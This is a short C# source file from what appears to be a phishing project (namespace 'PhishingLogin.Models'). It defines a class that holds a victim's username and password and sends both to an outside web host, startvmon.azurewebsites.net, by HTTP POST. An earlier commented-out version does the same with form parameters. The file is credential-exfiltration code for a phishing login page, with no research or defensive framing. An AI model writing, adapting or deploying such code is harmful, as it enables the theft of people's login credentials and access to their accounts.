using System.Collections.Generic;
using System.Net.Http;
using System.Data.Entity;

namespace PhishingLogin.Models
{
    public class Credentials
    {
        
        public string username { get; set; }
        public string password { get; set; }
        
        public Credentials(string u, string p)
        {
            this.username = u;
            this.password = p;
        }

        async public void Main(Credentials c)
        {
            var url = "https://startvmon.azurewebsites.net";


            /*HttpClient client = new HttpClient();
            var parameters = new Dictionary<string, string> { { "param1", c.username }, { "param2", c.password } };
            var encodedContent = new FormUrlEncodedContent(parameters);
            HttpResponseMessage response = await client.PostAsync(url, encodedContent);
            var results = response.Content.ReadAsStringAsync().Result.ToString();*/

            HttpClient client = new HttpClient();
            var values = new Dictionary<string, string>
            {
               { "username",  c.username},
               { "password",   c.password}
            };
            var response = await client.PostAsJsonAsync(url, values);

        }
    }

    

    
}

